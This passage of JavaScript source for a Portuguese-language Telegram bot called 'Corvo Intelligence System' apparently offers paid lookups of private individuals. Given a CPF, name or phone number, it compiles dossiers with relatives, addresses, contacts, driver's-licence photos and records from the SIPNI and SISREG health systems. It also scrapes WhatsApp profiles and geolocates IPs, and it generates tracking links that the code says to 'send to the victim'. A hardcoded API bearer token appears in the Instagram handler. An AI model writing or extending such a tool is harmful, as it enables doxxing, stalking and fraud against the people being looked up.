                ctx.reply(`✅ • *SAQUE SOLICITADO!*\n\nValor: R$ ${valor.toFixed(2)}\nChave PIX: \`${chavePix}\`\n\nAguarde a confirmação.`, { parse_mode: 'Markdown' });
                logEvent('ADMIN', `Saque de R$ ${valor.toFixed(2)} solicitado para ${chavePix}`);
            } else {
                ctx.reply(`❌ • Erro ao solicitar saque: ${result?.message || 'Erro desconhecido'}`);
            }
        } catch (e) {
            ctx.reply(`❌ • Erro ao solicitar saque: ${e.message}`);
        }
    } else if (state === 'wait_profile_num') {
        delete userStates[tid];
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.reply('❌ • WhatsApp Desconectado.');

        const num = text.replace(/[^0-9]/g, '');
        if (num.length < 10) return ctx.reply('❌ • Número inválido.');

        const jid = `${num}@s.whatsapp.net`;
        ctx.reply('🔍 • *Buscando informações no banco de dados do WhatsApp...*', { parse_mode: 'Markdown' }).catch(() => { });

        try {
            // Tenta obter foto de perfil
            let ppUrl;
            try {
                ppUrl = await sock.profilePictureUrl(jid, 'image');
            } catch (e) {
                ppUrl = null;
            }

            // Tenta obter Status/Bio
            let status;
            try {
                const statusData = await sock.fetchStatus(jid);
                status = statusData?.status || 'Sem Bio';
            } catch (e) {
                status = 'Privado ou Indisponível';
            }

            const msg = `<blockquote>👤 <b>INFORMAÇÕES DE PERFIL</b>\n\n` +
                `• <b>Número:</b> <code>${num}</code>\n` +
                `• <b>Bio/Status:</b> <code>${status}</code>\n` +
                `• <b>Link Direto:</b> <a href="https://wa.me/${num}">Clique aqui</a>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;

            if (ppUrl) {
                await ctx.replyWithPhoto(ppUrl, { caption: msg, parse_mode: 'HTML' });
            } else {
                ctx.reply(msg + '\n\n⚠️ <i>Foto de perfil privada ou indisponível.</i>', { parse_mode: 'HTML' });
            }
        } catch (err) {
            logEvent('ERROR', `Erro ao puxar perfil: ${err.message}`);
            ctx.reply('<blockquote>❌ <b>ERRO AO CONSULTAR PERFIL</b>\nVerifique se o número existe no WhatsApp.</blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_ip') {
        delete userStates[tid];
        const ip = text.trim();
        ctx.reply(`🌐 • *Consultando IP:* \`${ip}\`...`, { parse_mode: 'Markdown' }).catch(() => { });

        try {
            const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            if (res.data.status === 'fail') return ctx.reply(`❌ • Erro: ${res.data.message}`);

            const d = res.data;
            const msg = `<blockquote>🌐 <b>RESULTADO CONSULTA IP</b>\n\n` +
                `• <b>IP:</b> <code>${d.query}</code>\n` +
                `• <b>País:</b> <code>${d.country} (${d.countryCode})</code>\n` +
                `• <b>Cidade/Estado:</b> <code>${d.city} - ${d.regionName}</code>\n` +
                `• <b>CEP:</b> <code>${d.zip}</code>\n` +
                `• <b>Provedor:</b> <code>${d.isp}</code>\n` +
                `• <b>Org:</b> <code>${d.org || 'N/A'}</code>\n` +
                `• <b>Fuso:</b> <code>${d.timezone}</code>\n` +
                `• <b>Coord:</b> <code>${d.lat}, ${d.lon}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            ctx.reply(msg, { parse_mode: 'HTML' });
        } catch (e) {
            ctx.reply('<blockquote>❌ <b>ERRO NA CONSULTA IP</b></blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_cep') {
        delete userStates[tid];
        const cep = text.replace(/[^0-9]/g, '');
        if (cep.length !== 8) return ctx.reply('❌ • CEP inválido. Envie 8 números.');

        const waitMsg = await ctx.reply(`📮 • *Consultando CEP:* \`${cep}\`...`, { parse_mode: 'Markdown' });

        try {
            // API Pública Primária: ViaCEP
            const res = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);
            if (res.data.erro) throw new Error('not_found');

            const d = res.data;
            const msg = `<blockquote>📮 <b>RESULTADO CONSULTA CEP</b>\n\n` +
                `• <b>CEP:</b> <code>${d.cep}</code>\n` +
                `• <b>Endereço:</b> <code>${d.logradouro}</code>\n` +
                `• <b>Bairro:</b> <code>${d.bairro}</code>\n` +
                `• <b>Cidade/UF:</b> <code>${d.localidade}/${d.uf}</code>\n` +
                `• <b>DDD:</b> <code>${d.ddd}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            bot.telegram.editMessageText(tid, waitMsg.message_id, null, msg, { parse_mode: 'HTML' });
        } catch (e) {
            // API Secundária (Fallback): GonzalesDev
            try {
                const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=cep&cep=${cep}`;
                const res = await fetchApi(url, 2, 1000);
                if (res && !res.error && !res.erro) {
                    const d = res.dados || res;
                    const msg = `<blockquote>📮 <b>RESULTADO CONSULTA CEP (B2)</b>\n\n` +
                        `• <b>CEP:</b> <code>${d.cep || cep}</code>\n` +
                        `• <b>Endereço:</b> <code>${d.logradouro || d.endereco || 'N/A'}</code>\n` +
                        `• <b>Bairro:</b> <code>${d.bairro || 'N/A'}</code>\n` +
                        `• <b>Cidade/UF:</b> <code>${d.cidade || d.localidade}/${d.uf || d.estado}</code>\n\n` +
                        `⚡ <i>Corvo Intelligence System</i></blockquote>`;
                    return bot.telegram.editMessageText(tid, waitMsg.message_id, null, msg, { parse_mode: 'HTML' });
                }
            } catch (err2) { }
            bot.telegram.editMessageText(tid, waitMsg.message_id, null, '<blockquote>❌ <b>CEP NÃO ENCONTRADO</b></blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_cnpj') {
        delete userStates[tid];
        const cnpj = text.replace(/[^0-9]/g, '');
        if (cnpj.length !== 14) return ctx.reply('❌ • CNPJ inválido. Envie 14 números.');

        const waitMsg = await ctx.reply(`🏢 • *Consultando CNPJ:* \`${cnpj}\`...`, { parse_mode: 'Markdown' });

        try {
            // API Pública Primária: BrasilAPI
            const res = await axios.get(`https://brasilapi.com.br/api/cnpj/v1/${cnpj}`);
            const d = res.data;
            const msg = `<blockquote>🏢 <b>RESULTADO CONSULTA CNPJ</b>\n\n` +
                `• <b>Razão Social:</b> <code>${d.razao_social}</code>\n` +
                `• <b>Nome Fantasia:</b> <code>${d.nome_fantasia || 'N/A'}</code>\n` +
                `• <b>CNPJ:</b> <code>${d.cnpj}</code>\n` +
                `• <b>Abertura:</b> <code>${d.data_inicio_atividade}</code>\n` +
                `• <b>Situação:</b> <code>${d.descricao_situacao_cadastral}</code>\n\n` +
                `• <b>Endereço:</b> <code>${d.logradouro}, ${d.numero}</code>\n` +
                `• <b>Bairro:</b> <code>${d.bairro}</code>\n` +
                `• <b>Cidade/UF:</b> <code>${d.municipio}/${d.uf}</code>\n` +
                `• <b>CEP:</b> <code>${d.cep}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            bot.telegram.editMessageText(tid, waitMsg.message_id, null, msg, { parse_mode: 'HTML' });
        } catch (e) {
            // API Secundária (Fallback): GonzalesDev
            try {
                const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=cnpj&cnpj=${cnpj}`;
                const res = await fetchApi(url, 2, 1000);
                if (res && !res.error && !res.erro) {
                    const d = res.dados || res;
                    const msg = `<blockquote>🏢 <b>RESULTADO CONSULTA CNPJ (B2)</b>\n\n` +
                        `• <b>Razão Social:</b> <code>${d.razao_social || d.nome || 'N/A'}</code>\n` +
                        `• <b>CNPJ:</b> <code>${cnpj}</code>\n` +
                        `• <b>Situação:</b> <code>${d.situacao || 'N/A'}</code>\n\n` +
                        `⚡ <i>Corvo Intelligence System</i></blockquote>`;
                    return bot.telegram.editMessageText(tid, waitMsg.message_id, null, msg, { parse_mode: 'HTML' });
                }
            } catch (err2) { }
            bot.telegram.editMessageText(tid, waitMsg.message_id, null, '<blockquote>❌ <b>CNPJ NÃO ENCONTRADO</b></blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_cpf_basico') {
        delete userStates[tid];
        const cpf = text.replace(/[^0-9]/g, '');
        if (cpf.length !== 11) return ctx.reply('❌ • *CPF inválido.* Envie 11 números.', { parse_mode: 'Markdown' });
        const waitMsg = await ctx.reply(`⏳ • *Consultando CPF Completo:* \`${cpf}\`...\nBuscando dados e foto nacional...`, { parse_mode: 'Markdown' });
        logEvent('INFO', `Consulta CPF Completo: ${cpf} | Usuário: ${tid}`);

        try {
            // Buscas em paralelo (Dados e Foto)
            const [resDados, resFoto] = await Promise.allSettled([
                fetchApi(`${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=base_local&cpf=${cpf}`, 3, 1000),
                fetchApi(`${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=foto_cnh&cpf=${cpf}`, 3, 2000)
            ]);

            let d = resDados.status === 'fulfilled' ? resDados.value : null;
            if (d && (d.error || d.erro)) d = null;
            if (d) {
                if (Array.isArray(d)) d = d[0];
                if (d && d.dados) d = Array.isArray(d.dados) ? d.dados[0] : d.dados;
            }

            if (!d || (!d.cpf && !d.nome && !d["cpf/cnpj"])) {
                return bot.telegram.editMessageText(tid, waitMsg.message_id, null, '❌ • *CPF não encontrado em nossa base.*', { parse_mode: 'Markdown' });
            }

            // Extração Estruturada Elite
            const nome = d.nome || d.nome_completo || d.NOME || 'Não informado';
            const nascimento = d.data_nascimento || d.nascimento || 'Não informado';
            const sexo = d.sexo || 'Não informado';
            const mae = d.mae || d.nome_mae || 'Não informado';
            const pai = d.pai || d.nome_pai || 'Não informado';

            // Endereço
            const logradouro = d.logradouro || d.endereco || '';
            const numero = d.numero || '';
            const bairro = d.bairro || '';
            const cidade = d.cidade || d.municipio || '';
            const uf = d.uf || d.estado || '';
            const cep = d.cep || '';
            let endereco = `${logradouro}, ${numero} - ${bairro}, ${cidade}/${uf} - CEP: ${cep}`.replace(/^[,\s-]+|[,\s-]+$/g, '');
            if (endereco.length < 5) endereco = 'Não informado';

            // Telefones e Emails
            let contatos = '';
            if (d.telefones && Array.isArray(d.telefones)) {
                contatos += d.telefones.join('\n• ');
            } else if (d.telefone || d.tel) {
                contatos += d.telefone || d.tel;
            }
            if (d.emails && Array.isArray(d.emails)) {
                contatos += `\n✉️ ${d.emails.join('\n✉️ ')}`;
            } else if (d.email) {
                contatos += `\n✉️ ${d.email}`;
            }

            let msg = `<blockquote>🔍 <b>CONSULTA CPF COMPLETA (ELITE)</b>\n\n` +
                `👤 <b>DADOS PESSOAIS</b>\n` +
                `• <b>Nome:</b> <code>${nome}</code>\n` +
                `• <b>CPF:</b> <code>${cpf}</code>\n` +
                `• <b>Nascimento:</b> <code>${nascimento}</code>\n` +
                `• <b>Sexo:</b> <code>${sexo}</code>\n\n` +
                `👨‍👩‍👧 <b>FILIAÇÃO</b>\n` +
                `• <b>Mãe:</b> <code>${mae}</code>\n` +
                `• <b>Pai:</b> <code>${pai}</code>\n\n` +
                `📍 <b>LOCALIZAÇÃO</b>\n` +
                `• <code>${endereco}</code>\n\n` +
                `📞 <b>CONTATOS</b>\n` +
                `• <code>${contatos || 'Não informado'}</code>\n\n`;

            // Adicionar campos extras genéricos (Avós, RG, etc)
            const ignoreKeys = ['nome', 'cpf', 'data_nascimento', 'sexo', 'mae', 'pai', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'cep', 'telefones', 'telefone', 'emails', 'email', 'nome_completo', 'nascimento', 'nome_mae', 'nome_pai', 'endereco', 'municipio', 'estado', 'tel'];
            let extras = '';
            Object.entries(d).forEach(([key, value]) => {
                if (!ignoreKeys.includes(key.toLowerCase()) && typeof value !== 'object' && value) {
                    extras += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
                }
            });
            if (extras) msg += `➕ <b>INFORMAÇÕES EXTRAS</b>\n${extras}\n`;

            msg += `⚡ <i>Corvo Intelligence System</i></blockquote>`;

            // Verifica se a foto veio
            const fotoData = resFoto.status === 'fulfilled' ? resFoto.value : null;
            if (fotoData && !fotoData.error && fotoData.base64) {
                const buffer = Buffer.from(fotoData.base64, 'base64');
                await ctx.replyWithPhoto({ source: buffer }, { caption: msg, parse_mode: 'HTML' });
                await bot.telegram.deleteMessage(tid, waitMsg.message_id).catch(() => { });
            } else {
                bot.telegram.editMessageText(tid, waitMsg.message_id, null, msg, { parse_mode: 'HTML' });
            }

        } catch (e) {
            logEvent('ERROR', `Erro na API CPF Completo: ${e.message}`);
            bot.telegram.editMessageText(tid, waitMsg.message_id, null, '<blockquote>❌ <b>ERRO NA CONSULTA CPF</b></blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_track') {
        delete userStates[tid];
        const url = text.trim();
        ctx.reply('⏳ • <b>Gerando rastreio...</b>', { parse_mode: 'HTML' }).catch(() => { });
        try {
            const res = await criarRastreio(url);
            let msg = `<blockquote>🛰️ <b>RASTREIO CRIADO COM SUCESSO</b>\n\n` +
                `🔗 <b>URL Original:</b> <code>${url}</code>\n` +
                `📍 <b>Link de Rastreio:</b> <code>${res.trackingUrl}</code>\n` +
                `🔑 <b>Chave de Acesso:</b> <code>${res.accessKey}</code>\n\n` +
                `💡 <i>Envie o link para a vítima e acompanhe os logs usando a chave de acesso.</i>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            ctx.reply(msg, { parse_mode: 'HTML' });
        } catch (e) {
            ctx.reply('<blockquote>❌ <b>ERRO AO CRIAR RASTREIO</b></blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_nome') {
        delete userStates[tid];
        const nome = text.trim();
        const loader = await createLoadingBar(ctx, 'Consulta Nome');
        logEvent('INFO', `Consulta Nome: ${nome} | Usuário: ${tid}`);
        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=base_local&nome=${encodeURIComponent(nome)}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                const errorMsg = res.message || res.erro || 'Erro ao processar a consulta.';
                if (loader) await loader.stop('Erro', `❌ <b>${errorMsg.toUpperCase()}</b>`);
                return;
            }

            let d = res;
            if (d && d.dados && Array.isArray(d.dados)) d = d.dados;
            if (d && !Array.isArray(d) && d.nome) d = [d];

            if (!Array.isArray(d) || d.length === 0) {
                if (loader) await loader.stop('Sem Resultados', '❌ <b>NENHUM RESULTADO ENCONTRADO.</b>');
                return;
            }

            let msg = `<blockquote>🔍 <b>RESULTADOS POR NOME</b>\n\n`;
            d.slice(0, 10).forEach((item, i) => {
                msg += `👤 <b>Pessoa ${i + 1}:</b>\n`;
                Object.entries(item).forEach(([key, value]) => {
                    if (value && typeof value !== 'object') msg += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
                });
                msg += `\n`;
            });
            msg += `\n⚡ <i>Corvo Intelligence System</i></blockquote>`;

            if (msg.length > 4000) {
                const filePath = `./temp_nome_${tid}.txt`;
                fs.writeFileSync(filePath, msg.replace(/<[^>]*>/g, ''));
                await ctx.replyWithDocument({ source: filePath, filename: `resultado_nome.txt` }, { caption: `✅ • Consulta concluída.` });
                fs.unlinkSync(filePath);
                if (loader) await bot.telegram.deleteMessage(tid, loader.message_id).catch(() => { });
            } else {
                if (loader) await loader.stop('Resultado Nome', msg);
            }

        } catch (e) {
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA NOME</b></blockquote>');
        }

    } else if (state === 'wait_credilink_cpf') {
        delete userStates[tid];
        const cpf = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, 'Consulta Credlink');
        logEvent('INFO', `Consulta Credlink: ${cpf} | Usuário: ${tid}`);
        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=credilink&cpf=${cpf}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                const errorMsg = res.message || res.erro || 'Erro ao processar a consulta.';
                if (loader) await loader.stop('Erro', `❌ <b>${errorMsg.toUpperCase()}</b>`);
                return;
            }

            let c = res.dados_cadastrais || res.dados || res;
            if (Array.isArray(c)) c = c[0];

            if (!c || (!c.NOME && !c.nome)) {
                if (loader) await loader.stop('Não Encontrado', '❌ <b>CPF NÃO ENCONTRADO NA BASE CREDLINK.</b>');
                return;
            }


            let msg = `<blockquote>🔍 <b>RESULTADO CREDILINK</b>\n\n`;
            Object.entries(c).forEach(([key, value]) => {
                if (value && typeof value !== 'object') msg += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
            });
            msg += `\n⚡ <i>Corvo Intelligence System</i></blockquote>`;

            if (loader) await loader.stop('Resultado Credlink', msg);

        } catch (e) {
            logEvent('ERROR', `Erro na API Credlink: ${e.message}`);
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA CREDILINK</b></blockquote>');
        }

    } else if (state === 'wait_tel') {
        delete userStates[tid];
        const tel = text.replace(/[^0-9]/g, '');
        if (tel.length < 10) return ctx.reply('❌ • Número inválido. Envie o DDD + Número.');

        const loader = await createLoadingBar(ctx, 'Consulta Telefone');
        logEvent('INFO', `Consulta Telefone Elite: ${tel} | Usuário: ${tid}`);


        const ddd = tel.length === 11 ? tel.substring(0, 2) : tel.length === 13 ? tel.substring(2, 4) : tel.substring(0, 2);

        let regionalInfo = '';
        try {
            // API Pública: BrasilAPI (DDD)
            const resDDD = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`);
            if (resDDD.data) {
                regionalInfo = `📍 <b>REGIÃO (DDD ${ddd})</b>\n• <b>Estado:</b> <code>${resDDD.data.state}</code>\n• <b>Principais Cidades:</b> <code>${resDDD.data.cities.slice(0, 5).join(', ')}</code>\n\n`;
            }
        } catch (e) { }

        try {
            // 1. Busca vínculo do Telefone (API Premium)
            const urlTel = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=base_local&telefone=${tel}`;
            const resTel = await fetchApi(urlTel, 3, 1000);

            if (resTel.error || resTel.erro) {
                if (loader) await loader.stop('Erro', `❌ <b>${(resTel.message || resTel.erro || 'Erro ao consultar').toUpperCase()}</b>`);
                return;
            }


            let dTel = resTel.dados || resTel;
            if (!dTel || (Array.isArray(dTel) && dTel.length === 0)) {
                if (loader) await loader.stop('Não Encontrado', '❌ <b>TELEFONE NÃO ENCONTRADO EM NOSSA BASE.</b>');
                return;
            }


            const results = Array.isArray(dTel) ? dTel : [dTel];
            // Procura o melhor CPF vinculado
            const linkedCpfObj = results.find(item => item.cpf || item['cpf/cnpj'] || (item.documento && item.documento.length === 11));
            const cpfVinculado = linkedCpfObj ? (linkedCpfObj.cpf || linkedCpfObj['cpf/cnpj'] || linkedCpfObj.documento).replace(/[^0-9]/g, '') : null;

            if (cpfVinculado && cpfVinculado.length === 11) {
                // 2. Se achou CPF, faz o Puxadão Elite Automático
                if (loader) await loader.update(50, 100, `Vínculo: ${cpfVinculado}`);


                const [resDados, resFoto, resOperadora] = await Promise.allSettled([
                    fetchApi(`${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=base_local&cpf=${cpfVinculado}`, 3, 1000),
                    fetchApi(`${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=foto_cnh&cpf=${cpfVinculado}`, 3, 2000),
                    fetchApi(`${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=operadora&tel=${tel}`, 2, 1000)
                ]);

                const d = resDados.status === 'fulfilled' ? resDados.value : null;
                const op = resOperadora.status === 'fulfilled' ? resOperadora.value : null;
                const operadoraName = op ? (op.operadora || op.name || op.desc || 'Não informado') : 'Não informado';
                if (d && (d.error || d.erro)) d = null;
                if (d) {
                    if (Array.isArray(d)) d = d[0];
                    if (d && d.dados) d = Array.isArray(d.dados) ? d.dados[0] : d.dados;
                }

                if (d && (d.cpf || d.nome || d["cpf/cnpj"])) {
                    const nome = d.nome || d.nome_completo || d.NOME || 'Não informado';
                    const nascimento = d.data_nascimento || d.nascimento || 'Não informado';
                    const sexo = d.sexo || 'Não informado';
                    const rg = d.rg || d.identidade || d.numero_rg || 'Não informado';

                    const mae = d.mae || d.nome_mae || 'Não informado';
                    const pai = d.pai || d.nome_pai || 'Não informado';
                    const avo_paterna = d.avo_paterna || d.nome_avo_paterna || 'Não informado';
                    const avo_paterno = d.avo_paterno || d.nome_avo_paterno || 'Não informado';
                    const avo_materna = d.avo_materna || d.nome_avo_materna || 'Não informado';
                    const avo_materno = d.avo_materno || d.nome_avo_materno || 'Não informado';

                    const logradouro = d.logradouro || d.endereco || '';
                    const numero = d.numero || '';
                    const bairro = d.bairro || '';
                    const cidade = d.cidade || d.municipio || '';
                    const uf = d.uf || d.estado || '';
                    const cep = d.cep || '';
                    let endereco = `${logradouro}, ${numero} - ${bairro}, ${cidade}/${uf} - CEP: ${cep}`.replace(/^[,\s-]+|[,\s-]+$/g, '');
                    if (endereco.length < 5) endereco = 'Não informado';

                    let contatos = '';
                    if (d.telefones && Array.isArray(d.telefones)) contatos += d.telefones.join('\n• ');
                    else if (d.telefone || d.tel) contatos += d.telefone || d.tel;
                    if (d.emails && Array.isArray(d.emails)) contatos += `\n✉️ ${d.emails.join('\n✉️ ')}`;
                    else if (d.email) contatos += `\n✉️ ${d.email}`;

                    let msg = `<blockquote>🔍 <b>CONSULTA TELEFONE (DOSSIÊ COMPLETO)</b>\n\n` +
                        `📱 <b>Telefone Pesquisado:</b> <code>${tel}</code>\n` +
                        `📡 <b>Operadora:</b> <code>${operadoraName}</code>\n\n` +
                        regionalInfo +
                        `👤 <b>DADOS PESSOAIS VINCULADOS</b>\n` +
                        `• <b>Nome:</b> <code>${nome}</code>\n` +
                        `• <b>CPF:</b> <code>${cpfVinculado}</code>\n` +
                        `• <b>RG:</b> <code>${rg}</code>\n` +
                        `• <b>Nascimento:</b> <code>${nascimento}</code>\n` +
                        `• <b>Sexo:</b> <code>${sexo}</code>\n\n` +
                        `👨‍👩‍👧 <b>FILIAÇÃO</b>\n` +
                        `• <b>Mãe:</b> <code>${mae}</code>\n` +
                        `• <b>Pai:</b> <code>${pai}</code>\n\n` +
                        `👴 <b>AVÓS</b>\n` +
                        `• <b>Avó Paterna:</b> <code>${avo_paterna}</code>\n` +
                        `• <b>Avô Paterno:</b> <code>${avo_paterno}</code>\n` +
                        `• <b>Avó Materna:</b> <code>${avo_materna}</code>\n` +
                        `• <b>Avô Materno:</b> <code>${avo_materno}</code>\n\n` +
                        `📍 <b>LOCALIZAÇÃO</b>\n` +
                        `• <code>${endereco}</code>\n\n` +
                        `📞 <b>CONTATOS</b>\n` +
                        `• <code>${contatos || 'Não informado'}</code>\n\n`;

                    const ignoreKeys = ['nome', 'cpf', 'rg', 'identidade', 'numero_rg', 'data_nascimento', 'sexo', 'mae', 'pai', 'avo_paterna', 'avo_paterno', 'avo_materna', 'avo_materno', 'nome_avo_paterna', 'nome_avo_paterno', 'nome_avo_materna', 'nome_avo_materno', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'cep', 'telefones', 'telefone', 'emails', 'email', 'nome_completo', 'nascimento', 'nome_mae', 'nome_pai', 'endereco', 'municipio', 'estado', 'tel'];
                    let extras = '';
                    Object.entries(d).forEach(([key, value]) => {
                        if (!ignoreKeys.includes(key.toLowerCase()) && typeof value !== 'object' && value) {
                            extras += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
                        }
                    });
                    if (extras) msg += `➕ <b>INFORMAÇÕES EXTRAS</b>\n${extras}\n`;
                    msg += `⚡ <i>Corvo Intelligence System</i></blockquote>`;

                    const fotoData = resFoto.status === 'fulfilled' ? resFoto.value : null;
                    if (fotoData && !fotoData.error && fotoData.base64) {
                        const buffer = Buffer.from(fotoData.base64, 'base64');
                        await ctx.replyWithPhoto({ source: buffer }, { caption: msg, parse_mode: 'HTML' });
                        if (loader) await bot.telegram.deleteMessage(tid, loader.message_id).catch(() => { });
                        return; // Sucesso com foto
                    } else {
                        if (loader) await loader.stop('Resultado Telefone', msg);
                        return;
                    }

                }
            }

            // Fallback: Se não achar CPF válido ou falhar na busca detalhada, retorna a lista básica
            let msgFallback = `<blockquote>🔍 <b>RESULTADOS POR TELEFONE (BÁSICO)</b>\n\n` +
                `📱 <b>Telefone:</b> <code>${tel}</code>\n\n` +
                regionalInfo +
                `👤 <b>VÍNCULOS ENCONTRADOS:</b>\n`;
            results.slice(0, 10).forEach((item, i) => {
                msgFallback += `<b>[${i + 1}]</b>\n`;
                Object.entries(item).forEach(([key, value]) => {
                    if (value && typeof value !== 'object' && !['telefone'].includes(key.toLowerCase())) {
                        msgFallback += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
                    }
                });
                msgFallback += `\n`;
            });
            msgFallback += `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado Básico', msgFallback);


        } catch (e) {
            logEvent('ERROR', `Erro na API Telefone Elite: ${e.message}`);
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA TELEFONE</b></blockquote>');
        }

    } else if (state === 'wait_sipni') {
        delete userStates[tid];
        const cpf = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, 'Consulta SIPNI');
        logEvent('INFO', `Consulta SIPNI: ${cpf} | Usuário: ${tid}`);
        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=sipni&cpf=${cpf}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                const errorMsg = res.message || res.erro || 'Erro ao processar a consulta.';
                if (loader) await loader.stop('Erro', `❌ <b>${errorMsg.toUpperCase()}</b>`);
                return;
            }


            const d = res.cidadao || res.dados || res;
            let c = Array.isArray(d) ? d[0] : d;

            if (!c || (!c.nome && !c.NOME)) {
                if (loader) await loader.stop('Não Encontrado', '❌ <b>CPF NÃO ENCONTRADO NA BASE SIPNI.</b>');
                return;
            }


            let msg = `<blockquote>🔍 <b>RESULTADO SIPNI</b>\n\n`;
            Object.entries(c).forEach(([key, value]) => {
                if (value && typeof value !== 'object') msg += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
            });
            msg += `\n⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado SIPNI', msg);
        } catch (e) {
            logEvent('ERROR', `Erro na API SIPNI: ${e.message}`);
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA SIPNI</b></blockquote>');
        }
    } else if (state === 'wait_sisreg') {
        delete userStates[tid];
        const cpf = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, 'Consulta SISREG');

        logEvent('INFO', `Consulta SISREG: ${cpf} | Usuário: ${tid}`);
        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=sisregi&cpf=${cpf}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                const errorMsg = res.message || res.erro || 'Erro ao processar a consulta.';
                if (loader) await loader.stop('Erro', `❌ <b>${errorMsg.toUpperCase()}</b>`);
                return;
            }

            const d = res.dados || res;
            if (!d || Object.keys(d).length === 0) {
                if (loader) await loader.stop('Não Encontrado', '❌ <b>CPF NÃO ENCONTRADO NA BASE SISREG.</b>');
                return;
            }

            let msg = `<blockquote>🔍 <b>RESULTADO SISREG</b>\n\n`;
            const traverse = (obj) => {
                Object.entries(obj).forEach(([key, value]) => {
                    if (value && typeof value !== 'object') {
                        msg += `• <b>${key.toUpperCase()}:</b> <code>${value}</code>\n`;
                    } else if (value && typeof value === 'object' && !Array.isArray(value)) {
                        traverse(value);
                    }
                });
            };
            traverse(d);
            msg += `\n⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado SISREG', msg);
        } catch (e) {
            logEvent('ERROR', `Erro na API SISREG: ${e.message}`);
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA SISREG</b></blockquote>');
        }


    } else if (state === 'wait_instagram_url') {
        delete userStates[tid];
        const link = text.trim();
        if (!link.includes('instagram.com')) return ctx.reply('❌ • Link inválido. Envie um link válido do Instagram.');

        const msgWait = await ctx.reply('⏳ • *Baixando vídeo do Instagram...*').catch(() => { });
        const API_URL = `https://api-momoayse.aliancakkgr.com.br/api/Instagram`;
        const TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCb3QgY2xpZW50ZXMg4oCiIE1vbW8gYXlhc2UgIiwianRpIjoiZGQxYTNhYjMtOTViZi00ZDNjLWE1YTItMmYyZWFhMjIzODE4IiwiaWF0IjoxNzcwNjUyOTY4fQ.bwkkrVk0GdhYgP8yGZBm2IdoFnG-KNmnJCjxHJ-XkSE';

        try {
            const response = await axios.get(API_URL, {
                params: { url: link },
                headers: { Authorization: `Bearer ${TOKEN}` },
                responseType: 'arraybuffer'
            });
            await ctx.telegram.sendVideo(tid, { source: Buffer.from(response.data) }, { caption: '✅ • *Vídeo baixado com sucesso!*', parse_mode: 'Markdown' });
            await ctx.deleteMessage(msgWait.message_id).catch(() => { });
        } catch (e) {
            logEvent('ERROR', `Erro Instagram: ${e.message}`);
            ctx.reply('❌ • Erro ao baixar vídeo do Instagram. Verifique o link ou tente novamente mais tarde.');
        }
    } else if (state === 'wait_tiktok_url') {
        delete userStates[tid];
        const link = text.trim();
        if (!link.includes('tiktok.com')) return ctx.reply('❌ • Link inválido. Envie um link válido do TikTok.');

        const msgWait = await ctx.reply('⏳ • *Baixando vídeo do TikTok...*').catch(() => { });
        const API_URL = `https://api-momoayse.aliancakkgr.com.br/api/tiktok`;
